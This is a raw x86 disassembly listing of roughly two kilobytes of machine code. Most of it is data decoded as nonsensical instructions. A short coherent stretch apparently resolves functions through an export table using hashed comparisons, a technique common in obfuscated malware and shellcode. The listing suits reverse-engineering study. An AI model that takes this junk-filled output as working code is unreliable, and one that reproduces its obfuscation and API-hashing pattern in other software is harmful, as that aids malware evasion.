  414808:	pusha  
  414809:	retf   0x9789
  41480c:	mov    esp,0x5a96a0c2
  414811:	pop    esi
  414812:	fistp  WORD PTR [edi+0x27]
  414815:	adc    ecx,ebx
  414817:	inc    esp
  414818:	adc    al,0x55
  41481a:	mov    bh,0x36
  41481c:	or     DWORD PTR [eax],0x1a
  41481f:	outs   dx,DWORD PTR ds:[esi]
  414820:	adc    ah,BYTE PTR [edi+0x5a32d77b]
  414826:	jbe    0x414859
  414828:	dec    eax
  414829:	mov    al,ds:0xf53df584
  41482e:	aam    0xc3
  414830:	dec    ebx
  414831:	iret   
  414832:	rcr    BYTE PTR [esp],cl
  414835:	pop    edx
  414836:	dec    esp
  414837:	jg     0x4147f6
  414839:	int    0x3b
  41483b:	mov    ebx,0x8d58c6c2
  414840:	mov    esp,0x237a693b
  414845:	pop    esi
  414846:	call   0x363995d6
  41484b:	push   ebp
  41484c:	or     BYTE PTR [ecx+0x7],dl
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x4148c8
  414861:	pop    edx
  414862:	add    cl,BYTE PTR [ecx+0x707f7d12]
  414868:	mov    ecx,0x3370707e
  41486d:	ins    DWORD PTR es:[edi],dx
  41486e:	fnsave [edi+ecx*8+0x18]
  414872:	xchg   DWORD PTR [edi+0x7b],ebp
  414875:	(bad)  
  414877:	retf   
  414878:	in     al,0x96
  41487a:	cs sahf 
  41487c:	leave  
  41487d:	lods   al,BYTE PTR ds:[esi]
  41487e:	stos   DWORD PTR es:[edi],eax
  41487f:	xchg   edx,eax
  414880:	pop    ss
  414881:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414882:	dec    ecx
  414883:	inc    ebp
  414884:	test   ecx,esi
  414886:	push   eax
  414887:	clc    
  414888:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414889:	lds    edi,FWORD PTR [ecx+0x5746be5e]
  41488f:	mov    dl,0x96
  414891:	outs   dx,DWORD PTR ds:[esi]
  414892:	or     edi,eax
  414894:	call   0x3971:0xb9327417
  41489b:	or     edx,DWORD PTR [esi-0x76]
  41489e:	jne    0x414835
  4148a0:	push   es
  4148a1:	cwde   
  4148a2:	mov    ebp,0x4865fd31
  4148a7:	test   eax,0xa48eff37
  4148ac:	popf   
  4148ad:	jb     0x41490a
  4148af:	mov    ebx,0xf9007f63
  4148b4:	cmc    
  4148b5:	xchg   edx,eax
  4148b6:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148b8:	mov    DWORD PTR [ebx+0xd],esi
  4148bb:	mov    ebx,0x69324df8
  4148c0:	outs   dx,BYTE PTR ds:[esi]
  4148c1:	(bad)  
  4148c2:	mov    edx,0x1003b11f
  4148c7:	inc    edx
  4148c8:	iret   
  4148c9:	(bad)  
  4148ca:	push   ss
  4148cb:	aam    0x36
  4148cd:	fsubr  QWORD PTR [eax-0x225bbf4]
  4148d3:	xchg   BYTE PTR [esi],dh
  4148d5:	adc    eax,0xcf6eb8f4
  4148da:	(bad)  
  4148db:	aad    0xea
  4148dd:	push   edx
  4148de:	xor    eax,0x7d35b005
  4148e3:	ret    0xe575
  4148e6:	les    eax,FWORD PTR [edx+0x19aa0e88]
  4148ec:	mov    ebp,0x8c343c04
  4148f1:	(bad)  
  4148f2:	out    0x1f,al
  4148f4:	sbb    ebx,esp
  4148f6:	adc    eax,0x398aca6a
  4148fb:	push   esi
  4148fc:	mov    al,0x58
  4148fe:	xchg   ecx,eax
  4148ff:	mov    ch,0xae
  414901:	sub    bl,BYTE PTR [ecx]
  414903:	push   ecx
  414904:	cmp    esi,DWORD PTR [ebp-0x28cc46a3]
  41490a:	jecxz  0x4148d7
  41490c:	lods   al,BYTE PTR ds:[esi]
  41490d:	clc    
  41490e:	pusha  
  41490f:	jbe    0x41495d
  414911:	clc    
  414912:	xor    edi,ecx
  414914:	addr16 cld 
  414916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414917:	add    eax,0x36cb913a
  41491c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41491d:	aaa    
  41491e:	jmp    0xd9d44b66
  414923:	sbb    BYTE PTR [edx+eax*1-0x7999841e],al
  41492a:	add    al,0xea
  41492c:	popa   
  41492d:	sub    edx,DWORD PTR [ebx+eax*4-0xdd41935]
  414934:	dec    esi
  414935:	imul   esp,DWORD PTR [edx],0xd523014e
  41493b:	data16 arpl WORD PTR [esi+eax*1],ax
  41493f:	out    0x17,al
  414941:	daa    
  414942:	(bad)  
  414943:	and    dh,BYTE PTR [ebx+ebp*4-0x30]
  414947:	push   esp
  414948:	push   edi
  414949:	adc    esp,DWORD PTR [ebp+0x3c]
  41494c:	xor    BYTE PTR [eax+0x3a],ch
  41494f:	and    edx,esp
  414951:	push   esp
  414952:	and    bl,BYTE PTR [edi]
  414954:	mov    edi,0xf132f8c5
  414959:	les    ebp,FWORD PTR [ebx-0x4dc52fc5]
  41495f:	sub    BYTE PTR [ebx],ah
  414961:	add    ah,BYTE PTR [edi-0x5981b217]
  414967:	ins    DWORD PTR es:[edi],dx
  414968:	cmc    
  414969:	icebp  
  41496a:	test   al,0x2c
  41496c:	cmp    dh,al
  41496e:	aam    0xaa
  414970:	std    
  414971:	fnsave [ebx+eax*2+0xa]
  414975:	sti    
  414976:	les    edx,FWORD PTR [eax-0x1]
  414979:	push   ss
  41497a:	(bad)  
  41497b:	loop   0x41497e
  41497d:	and    al,0x4e
  41497f:	push   ebx
  414980:	or     DWORD PTR [edx+eiz*1],edi
  414983:	jge    0x414a02
  414985:	mov    al,ds:0x6622aeab
  41498a:	std    
  41498b:	jb     0x4149b5
  41498d:	sti    
  41498e:	or     bh,BYTE PTR [esi]
  414990:	dec    eax
  414991:	jp     0x4149ed
  414993:	adc    dh,ch
  414995:	into   
  414996:	xor    edi,0x4201a98a
  41499c:	out    0x98,al
  41499e:	dec    ecx
  41499f:	ins    DWORD PTR es:[edi],dx
  4149a0:	dec    eax
  4149a1:	mov    bl,dh
  4149a3:	jp     0x41496f
  4149a5:	jbe    0x41495b
  4149a7:	mov    ebp,0x9a1bb17f
  4149ac:	inc    eax
  4149ad:	mov    al,ds:0xbff1fdef
  4149b2:	mov    BYTE PTR ds:0x70979205,dh
  4149b8:	icebp  
  4149b9:	sbb    al,0x41
  4149bb:	dec    edi
  4149bc:	sub    ebx,DWORD PTR [edi]
  4149be:	stos   DWORD PTR es:[edi],eax
  4149bf:	hlt    
  4149c0:	sub    BYTE PTR [eax+0x32],dh
  4149c3:	or     DWORD PTR [esi],0xffffff88
  4149c6:	cmc    
  4149c7:	imul   ebp,DWORD PTR ds:0x6f7e9e13,0x5d7b3878
  4149d1:	out    0x1d,eax
  4149d3:	inc    ebx
  4149d4:	inc    edi
  4149d5:	cdq    
  4149d6:	jns    0x414962
  4149d8:	scas   eax,DWORD PTR es:[edi]
  4149d9:	jmp    0xeca9:0x89f2bda6
  4149e0:	imul   BYTE PTR ds:0xfeb0d3af
  4149e6:	test   BYTE PTR [edx-0x53],cl
  4149e9:	aad    0x95
  4149eb:	jnp    0x414987
  4149ed:	mov    edi,cs
  4149ef:	xchg   edi,eax
  4149f0:	imul   esp,esi,0xffffff89
  4149f3:	mov    esp,ebp
  4149f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149f6:	jae    0x414998
  4149f8:	xor    cl,BYTE PTR [esp+ebx*4]
  4149fb:	or     DWORD PTR [eax-0x4fe2b602],ebx
  414a01:	jge    0x4149d0
  414a03:	dec    esp
  414a04:	inc    edx
  414a05:	pop    ss
  414a06:	stos   BYTE PTR es:[edi],al
  414a07:	add    ah,dh
  414a09:	pop    edx
  414a0a:	inc    edx
  414a0b:	mov    al,ds:0x1cb4a71e
  414a10:	mov    dh,0x44
  414a12:	push   ds
  414a13:	mov    edx,es
  414a15:	pop    ebx
  414a16:	inc    esi
  414a17:	push   ecx
  414a18:	jo     0x4149c6
  414a1a:	rol    edx,0x2b
  414a1d:	stos   DWORD PTR es:[edi],eax
  414a1e:	popf   
  414a1f:	xor    DWORD PTR [ebx],0x5b
  414a22:	cmp    cl,dh
  414a24:	outs   dx,DWORD PTR fs:[esi]
  414a26:	dec    edi
  414a27:	sub    dh,BYTE PTR [ebx]
  414a29:	xor    al,0x77
  414a2b:	xor    al,0x3f
  414a2d:	dec    DWORD PTR [ebx]
  414a2f:	sub    bh,cl
  414a31:	adc    dl,BYTE PTR [eax-0x12679a6e]
  414a37:	jmp    0x20d4:0x2bc6ccc
  414a3e:	sahf   
  414a3f:	or     al,al
  414a41:	pusha  
  414a42:	inc    esi
  414a43:	mov    al,ds:0x2192847f
  414a48:	scas   eax,DWORD PTR es:[edi]
  414a49:	add    dl,BYTE PTR [esi]
  414a4b:	push   0xac3d5f5b
  414a50:	cmp    BYTE PTR [ebp-0x4a5a3bdd],0x36
  414a57:	pmaxub mm7,mm3
  414a5a:	scas   eax,DWORD PTR es:[edi]
  414a5b:	cmp    ecx,ebx
  414a5d:	cmp    bl,BYTE PTR [esi]
  414a5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a60:	repz sub bh,ch
  414a63:	inc    ebp
  414a64:	jmp    0x414a74
  414a66:	jo     0x414a44
  414a68:	ins    DWORD PTR es:[edi],dx
  414a69:	cld    
  414a6a:	add    ebx,DWORD PTR [edi+0x7709674a]
  414a70:	lock es push ss
  414a73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a74:	xchg   ecx,eax
  414a75:	xchg   ebx,eax
  414a76:	push   cs
  414a77:	(bad)  
  414a78:	addr16 mov edi,0x8ae314f5
  414a7e:	repnz add DWORD PTR [esi+0x77],ebp
  414a82:	lahf   
  414a83:	xchg   edi,eax
  414a84:	adc    DWORD PTR [esi-0x3f],ebp
  414a87:	stos   BYTE PTR es:[edi],al
  414a88:	mov    bh,0x8d
  414a8a:	in     eax,0xf5
  414a8c:	cmp    al,0xd1
  414a8e:	in     eax,dx
  414a8f:	lea    ecx,[ebx+0x2c25e462]
  414a95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a96:	std    
  414a97:	add    ebx,eax
  414a99:	mov    cl,0x87
  414a9b:	jmp    0xe508e43c
  414aa0:	jae    0x414ab2
  414aa2:	lds    ebx,FWORD PTR [ebx-0x56cf771]
  414aa8:	test   al,0xad
  414aaa:	mov    al,ds:0xa79fa1f4
  414aaf:	or     DWORD PTR [esi],0x3f3a7066
  414ab5:	inc    esp
  414ab6:	add    DWORD PTR ds:0xaa2f78f,edx
  414abc:	ss pop eax
  414abe:	into   
  414abf:	dec    esi
  414ac0:	inc    eax
  414ac1:	sbb    eax,DWORD PTR fs:[ecx+0x2f]
  414ac5:	mov    WORD PTR [esi],gs
  414ac7:	in     al,0x40
  414ac9:	iret   
  414aca:	cmp    esp,eax
  414acc:	jns    0x414ad5
  414ace:	js     0x414a9b
  414ad0:	(bad)  
  414ad2:	xlat   BYTE PTR ds:[ebx]
  414ad3:	(bad)  
  414ad4:	pop    ecx
  414ad5:	je     0x414a95
  414ad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ad8:	enter  0x412e,0xc6
  414adc:	jge    0x414a80
  414ade:	jg     0x414a7b
  414ae0:	adc    ebp,edi
  414ae2:	aad    0xea
  414ae4:	(bad)  
  414ae6:	out    0xc8,eax
  414ae8:	sub    eax,0x266200b6
  414aed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414aee:	popa   
  414aef:	adc    al,0xc
  414af1:	pop    es
  414af2:	sub    eax,0x82fa93a6
  414af7:	sub    bl,BYTE PTR [edi]
  414af9:	jbe    0x414ad7
  414afb:	jmp    0xc15e:0x6ad9dd80
  414b02:	(bad)  
  414b03:	mov    ebp,0x2681f2dd
  414b08:	popf   
  414b09:	sub    ecx,ecx
  414b0b:	adc    edi,DWORD PTR [ecx-0xd]
  414b0e:	aad    0x3d
  414b10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b11:	iret   
  414b12:	or     edi,DWORD PTR [edi+0x5c]
  414b15:	test   eax,0x9090864f
  414b1a:	jp     0x414b29
  414b1c:	pop    es
  414b1d:	aas    
  414b1e:	jbe    0x414ac4
  414b20:	dec    eax
  414b21:	dec    edx
  414b22:	or     al,0x7d
  414b24:	xchg   DWORD PTR [ebx],ebx
  414b26:	jae    0x414b89
  414b28:	sti    
  414b29:	pop    es
  414b2a:	jecxz  0x414b91
  414b2c:	dec    ecx
  414b2d:	sub    edx,DWORD PTR [ebx]
  414b2f:	pop    edx
  414b30:	fadd   st,st(1)
  414b32:	jb     0x414b37
  414b34:	ret    
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	cdq    
  414bb7:	mov    dh,0x50
  414bb9:	xor    ebx,DWORD PTR [ebx+0x7b]
  414bbc:	jg     0x414c2e
  414bbe:	mov    ecx,0xe670707e
  414bc3:	test   al,0x86
  414bc5:	adc    esp,0xffffff8b
  414bc8:	add    ecx,ecx
  414bca:	dec    eax
  414bcb:	or     eax,0x70d1bffd
  414bd0:	xchg   ebp,eax
  414bd1:	inc    eax
  414bd2:	mov    ecx,0x6c4e37b2
  414bd7:	lahf   
  414bd8:	(bad)  
  414bd9:	mov    WORD PTR [ebx+0x4589dad5],es
  414bdf:	add    DWORD PTR [ebx+0x741b2173],ecx
  414be5:	mov    ebx,0xb6b6edea
  414bea:	pop    ds
  414beb:	sbb    DWORD PTR [edx],ecx
  414bed:	mov    bh,0x92
  414bef:	sbb    eax,0x21c63faa
  414bf4:	shr    DWORD PTR [eax+ecx*2],0xf
  414bf8:	(bad)  
  414bf9:	imul   DWORD PTR [esi+0x77]
  414bfc:	mov    ds:0xcf17efb4,al
  414c01:	out    dx,eax
  414c02:	mov    al,ds:0x8200bb1e
  414c07:	scas   eax,DWORD PTR es:[edi]
  414c08:	pop    ss
  414c09:	lahf   
  414c0a:	fld    QWORD PTR [ebx+0x72]
  414c0d:	inc    DWORD PTR [edx]
  414c0f:	hlt    
  414c10:	popf   
  414c11:	pop    ebx
  414c12:	lods   al,BYTE PTR ds:[esi]
  414c13:	jb     0x414c4f
  414c15:	iret   
  414c16:	push   esi
  414c17:	and    eax,0x1485d51f
  414c1c:	hlt    
  414c1d:	push   edx
  414c1e:	dec    eax
  414c1f:	popa   
  414c20:	test   eax,0x7e8d58ac
  414c25:	xchg   edi,eax
  414c26:	into   
  414c27:	pop    es
  414c28:	push   edx
  414c29:	or     al,BYTE PTR [ebx-0x1a1cf6e8]
  414c2f:	or     al,0x64
  414c31:	neg    BYTE PTR [ebx]
  414c33:	inc    ebx
  414c34:	jg     0x414beb
  414c36:	ror    DWORD PTR [ecx+eiz*2-0xa],0x4f
  414c3b:	retf   0x32e2
  414c3e:	fsubr  DWORD PTR [ebx+eiz*1+0x5b06d285]
  414c45:	push   ecx
  414c46:	(bad)  
  414c48:	addr16 stc 
  414c4a:	mov    gs,ebx
  414c4c:	imul   edi,DWORD PTR [eax-0x72],0x42ba8423
  414c53:	scas   al,BYTE PTR es:[edi]
  414c54:	add    DWORD PTR es:[eax+0x6b485cad],eax
  414c5b:	adc    ebx,DWORD PTR [esi+0x50]
  414c5e:	(bad)  
  414c5f:	jnp    0x414c43
  414c61:	cwde   
  414c62:	xor    esp,DWORD PTR [edi+0x3edf0694]
  414c68:	in     al,dx
  414c69:	pusha  
  414c6a:	sbb    BYTE PTR [edx],0x59
  414c6d:	ret    
  414c6e:	mov    ebp,DWORD PTR [edx+0x21]
  414c71:	dec    edx
  414c72:	ror    DWORD PTR ds:0x6ef39917,0xd1
  414c79:	and    al,0x41
  414c7b:	or     eax,0x8763001
  414c80:	add    bl,bl
  414c82:	xor    eax,0x66268bd1
  414c87:	xor    al,0x34
  414c89:	xor    DWORD PTR [edx+edx*2-0x4],ebp
  414c8d:	lods   eax,DWORD PTR fs:[esi]
  414c8f:	out    dx,al
  414c90:	in     eax,0xf1
  414c92:	test   DWORD PTR [eax+0x1a],esi
  414c95:	enter  0x55c9,0xea
  414c99:	test   eax,0x91d1a0b8
  414c9e:	stc    
  414c9f:	jp     0x414ccc
  414ca1:	fidiv  DWORD PTR [ebx+edi*4+0x4edad5c7]
  414ca8:	out    0x2f,eax
  414caa:	rcr    BYTE PTR [eax+ebx*8],1
  414cad:	jmp    0xfd7e:0xa88e4758
  414cb4:	dec    esp
  414cb5:	lahf   
  414cb6:	mov    dh,0xed
  414cb8:	adc    ah,BYTE PTR [edi+0x1d265185]
  414cbe:	cs jmp 0xcb451734
  414cc4:	fild   DWORD PTR [esi]
  414cc6:	push   ebp
  414cc7:	je     0x414c51
  414cc9:	stos   BYTE PTR es:[edi],al
  414cca:	loopne 0x414d0a
  414ccc:	mov    ds:0x9615a3cc,eax
  414cd1:	sub    ah,cl
  414cd3:	pop    es
  414cd4:	add    eax,0xf905881c
  414cd9:	mov    esi,esp
  414cdb:	cli    
  414cdc:	int    0xcb
  414cde:	stos   DWORD PTR es:[edi],eax
  414cdf:	xlat   BYTE PTR ds:[ebx]
  414ce0:	int    0xf6
  414ce2:	mov    cl,0xaf
  414ce4:	cmp    DWORD PTR [edx-0x41],eax
  414ce7:	mov    eax,0xcc6eaaf
  414cec:	jnp    0x414d16
  414cee:	test   al,0xb5
  414cf0:	mov    edi,0x28b44d9b
  414cf5:	repnz inc esi
  414cf7:	jg     0x414cc5
  414cf9:	push   ebx
  414cfa:	pop    ecx
  414cfb:	stc    
  414cfc:	imul   edx,DWORD PTR [edx-0x6d9aace2],0xbe960172
  414d06:	jo     0x414d1b
  414d08:	call   0xfe8ce4b5
  414d0d:	jo     0x414c9c
  414d0f:	fisttp DWORD PTR [ebp+0x6b08e643]
  414d15:	pop    esp
  414d16:	(bad)  
  414d17:	fiadd  WORD PTR [ebx+0xdfd812]
  414d1d:	ss sar edi,1
  414d20:	add    al,0x63
  414d22:	and    dl,BYTE PTR cs:[ebp+0x62b9618]
  414d29:	adc    eax,0x43e30c1d
  414d2e:	push   ds
  414d2f:	ror    DWORD PTR [ebx+0x66999b04],0xb4
  414d36:	inc    ebx
  414d37:	xor    al,0x35
  414d39:	mov    ebp,0x7ed2150b
  414d3e:	adc    BYTE PTR [ecx+0x5ac9c2ea],dh
  414d44:	pop    edx
  414d45:	(bad)  
  414d47:	push   ebp
  414d48:	jge    0x414db1
  414d4a:	sbb    BYTE PTR ds:0xdfeaa65b,al
  414d50:	sub    esp,ebp
  414d52:	adc    al,0x81
  414d54:	cld    
  414d55:	cmp    al,0xc6
  414d57:	cli    
  414d58:	add    ebx,edx
  414d5a:	or     dl,dh
  414d5c:	mov    ds:0xb16d14b5,eax
  414d61:	add    al,0xea
  414d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d64:	fbld   TBYTE PTR [eax+0x6d]
  414d67:	(bad)  [ebx-0x22]
  414d6a:	mov    fs,WORD PTR [esi+0x42]
  414d6d:	int    0x7e
  414d6f:	add    eax,0xfa4df016
  414d74:	sub    esi,edi
  414d76:	add    DWORD PTR [eax+0x78],edx
  414d79:	xchg   esi,eax
  414d7a:	das    
  414d7b:	(bad)  
  414d7d:	ret    
  414d7e:	mov    bl,0x37
  414d80:	gs imul esi,esp,0xcaca71c8
  414d87:	das    
  414d88:	scas   al,BYTE PTR es:[edi]
  414d89:	cdq    
  414d8a:	mov    ebp,DWORD PTR [ebx+ecx*4]
  414d8d:	shr    DWORD PTR [ebp+eiz*2-0x62335c79],1
  414d94:	rcr    BYTE PTR [ebp+0x34],1
  414d97:	retf   0xe526
  414d9a:	pop    esp
  414d9b:	jmp    0x414e14
  414d9d:	test   BYTE PTR [ecx+0x4c6c260d],dh
  414da3:	pop    eax
  414da4:	fst    DWORD PTR [ecx+0x7b7e5c8f]
  414daa:	shl    BYTE PTR [edi-0x2c],cl
  414dad:	xor    ah,bl
  414daf:	mov    BYTE PTR [edx-0x4a408613],ch
  414db5:	rcl    BYTE PTR [eax-0x1b77b27b],0x42
  414dbc:	nop
  414dbd:	ret    
  414dbe:	mov    esi,DWORD PTR [edi+0x67b8041c]
  414dc4:	jl     0x414e1f
  414dc6:	mov    ecx,0x10f6cdd8
  414dcb:	mov    edx,ebp
  414dcd:	ja     0x414e31
  414dcf:	dec    esp
  414dd0:	dec    edx
  414dd1:	gs inc eax
  414dd3:	scas   eax,DWORD PTR es:[edi]
  414dd4:	ret    0xaa56
  414dd7:	shr    DWORD PTR [ecx+0xc],0x8
  414ddb:	lock adc edi,ebp
  414dde:	fistp  QWORD PTR [ebx+ebx*8-0x65]
  414de2:	ds inc edi
  414de4:	mov    edi,0x86794cb4
  414de9:	scas   al,BYTE PTR es:[edi]
  414dea:	mov    al,bl
  414dec:	xor    al,0x31
  414dee:	inc    esi
  414def:	inc    edx
  414df0:	stos   DWORD PTR es:[edi],eax
  414df1:	mov    WORD PTR [ecx+0x35dbab52],ds
  414df7:	fdivr  DWORD PTR [edx+0x3742b96f]
  414dfd:	mov    esi,DWORD PTR [eax-0x20]
  414e00:	inc    esp
  414e01:	cwde   
  414e02:	test   DWORD PTR [ebx],edi
  414e04:	or     edx,ebp
  414e06:	ins    BYTE PTR es:[edi],dx
  414e07:	push   eax
  414e08:	inc    eax
  414e09:	jno    0x414da6
  414e0b:	in     al,0xc0
  414e0d:	xor    edx,DWORD PTR [esi-0x313795dc]
  414e13:	call   0xc84b:0xd14ad11b
  414e1a:	adc    eax,0xd4e121f9
  414e1f:	push   ds
  414e20:	and    BYTE PTR [eax],bl
  414e22:	je     0x414dd1
  414e24:	inc    ebx
  414e25:	adc    edx,DWORD PTR ds:0x879fa281
  414e2b:	(bad)  
  414e2d:	in     al,0x6a
  414e2f:	sub    ebx,DWORD PTR [ebp+0x55]
  414e32:	jne    0x414e6a
  414e34:	push   0x75
  414e36:	jns    0x414eb3
  414e38:	pop    ss
  414e39:	inc    esi
  414e3a:	lahf   
  414e3b:	test   BYTE PTR [esi+eiz*1+0x573cfe82],cl
  414e42:	(bad)  
  414e43:	aas    
  414e44:	aad    0xcf
  414e46:	pop    ss
  414e47:	scas   al,BYTE PTR es:[edi]
  414e48:	mov    dh,0xa9
  414e4a:	jg     0x414e7a
  414e4c:	test   al,0x81
  414e4e:	xor    al,0xc4
  414e50:	push   ebp
  414e51:	rol    BYTE PTR [ebp-0x179d0762],cl
  414e57:	out    dx,al
  414e58:	jne    0x414ed3
  414e5a:	add    ah,BYTE PTR [ebx]
  414e5c:	into   
  414e5d:	leave  
  414e5e:	push   ss
  414e5f:	lds    edx,FWORD PTR [ebx+0x4b2bfa18]
  414e65:	cmp    cl,BYTE PTR [edi-0x599b8420]
  414e6b:	mov    edx,0x4bddf227
  414e70:	fdiv   st,st(4)
  414e72:	ficomp DWORD PTR [esi]
  414e74:	mov    ebx,0x4c5b780e
  414e79:	out    dx,al
  414e7a:	xchg   ebx,eax
  414e7b:	push   esp
  414e7c:	lods   eax,DWORD PTR ds:[esi]
  414e7d:	jmp    0x414e85
  414e7f:	das    
  414e80:	mov    cl,0xc8
  414e82:	cs cs ss pop ds
  414e86:	mov    esp,0x6a593244
  414e8b:	add    eax,0xcb875b49
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	lods   eax,DWORD PTR ds:[esi]
  414ead:	add    al,0x40
  414eaf:	add    eax,0x707f78a4
  414eb4:	mov    ecx,0xa270707e
  414eb9:	call   0x2420:0x10ea66c0
  414ec0:	sub    al,0x1e
  414ec2:	int    0x8c
  414ec4:	and    DWORD PTR [edi-0x1ecc6f55],ecx
  414eca:	xchg   edi,eax
  414ecb:	leave  
  414ecc:	jmp    0x4641:0x3c1e7edd
  414ed3:	or     al,0x84
  414ed5:	in     al,dx
  414ed6:	rcr    DWORD PTR [ebp+0x12],1
  414ed9:	or     DWORD PTR [ebp-0x92972d7],ebx
  414edf:	jne    0x414efa
  414ee1:	je     0x414f44
  414ee3:	test   al,0xa1
  414ee5:	or     ch,BYTE PTR [esi+0x48383c88]
  414eeb:	aam    0xc8
  414eed:	jge    0x414f1e
  414eef:	xchg   ebx,eax
  414ef0:	outs   dx,DWORD PTR ds:[esi]
  414ef1:	add    DWORD PTR [ebp-0x166227a1],esp
  414ef7:	in     al,0xca
  414ef9:	adc    bh,BYTE PTR [eax-0x16]
  414efc:	or     esi,DWORD PTR [esi+edi*8-0x55]
  414f00:	lods   eax,DWORD PTR ds:[esi]
  414f01:	inc    ecx
  414f02:	cmp    al,0x90
  414f04:	and    eax,0xe312a194
  414f09:	mov    gs,ecx
  414f0b:	mov    esi,DWORD PTR [eax-0x2b]
  414f0e:	scas   al,BYTE PTR es:[edi]
  414f0f:	cwde   
  414f10:	test   DWORD PTR [ebx+0x3e],edx
  414f13:	outs   dx,BYTE PTR ds:[esi]
  414f14:	out    0x4d,eax
  414f16:	scas   al,BYTE PTR es:[edi]
  414f17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f18:	mov    al,0x50
  414f1a:	test   BYTE PTR [esi-0x79],ch
  414f1d:	bound  edx,QWORD PTR ds:0x79fbd5eb
  414f23:	or     al,0x5e
  414f25:	jecxz  0x414f39
  414f27:	push   0xffffff9d
  414f29:	jnp    0x414eff
  414f2b:	jmp    0x414ede
  414f2d:	sub    al,0x97
  414f2f:	xor    ch,BYTE PTR [edx]
  414f31:	and    bl,BYTE PTR [ecx+0x3ccf1210]
  414f37:	mov    al,BYTE PTR [esi+0x34]
  414f3a:	loopne 0x414f52
  414f3c:	xor    DWORD PTR [eax-0x6106080e],ebx
  414f42:	jbe    0x414eeb
  414f44:	imul   esi,DWORD PTR [edi-0x5bebb59d],0x96709ff5
  414f4e:	sbb    ebp,edx
  414f50:	push   ds
  414f51:	pop    eax
  414f52:	cwde   
  414f53:	add    eax,0x34df80c9
  414f58:	addr16 pop eax
  414f5a:	imul   ebx,DWORD PTR [esi-0x74],0xffffff83
  414f5e:	mov    ch,ch
  414f60:	cmc    
  414f61:	adc    DWORD PTR [eax+0x7b978d10],ebp
  414f67:	or     BYTE PTR [edx],bl
  414f69:	fs sbb eax,0xc3d9f525
  414f6f:	adc    eax,0xd1e8e68c
  414f74:	push   edx
  414f75:	jb     0x414fac
  414f77:	cmp    eax,0xb5205796
  414f7c:	mov    ah,0xce
  414f7e:	inc    ecx
  414f80:	dec    ebx
  414f81:	sub    edi,ecx
  414f83:	add    DWORD PTR [ecx],edi
  414f85:	jl     0x414f40
  414f87:	fbstp  TBYTE PTR [esi+0xf]
  414f8a:	outs   dx,BYTE PTR ds:[esi]
  414f8b:	sub    eax,0xc60de56a
  414f90:	stos   DWORD PTR es:[edi],eax
  414f91:	out    dx,al
  414f92:	sub    al,0xfc
  414f94:	jae    0x415008
  414f96:	aas    
  414f97:	pop    eax
  414f98:	fadd   DWORD PTR [edx-0x6e]
  414f9b:	mov    ds:0x754a8eae,eax
  414fa0:	sti    
  414fa1:	jae    0x414fa2
  414fa3:	shr    DWORD PTR [ebx+ebp*8],1
  414fa6:	pop    edx
  414fa7:	pop    ecx
  414fa8:	pop    esi
  414fa9:	lds    edi,FWORD PTR [edi+ebx*1]
  414fac:	or     eax,0xc0d39f84
  414fb1:	les    edx,FWORD PTR [esi]
  414fb3:	lods   eax,DWORD PTR ds:[esi]
  414fb4:	ja     0x414f8f
  414fb6:	loope  0x414f64
  414fb8:	inc    esp
  414fb9:	xor    al,BYTE PTR [ecx-0x6d9698f0]
  414fbf:	repz mov bl,0x89
  414fc2:	push   ds
  414fc3:	ins    BYTE PTR es:[edi],dx
  414fc4:	xor    DWORD PTR [edx-0x5b580423],ebp
  414fca:	(bad)  
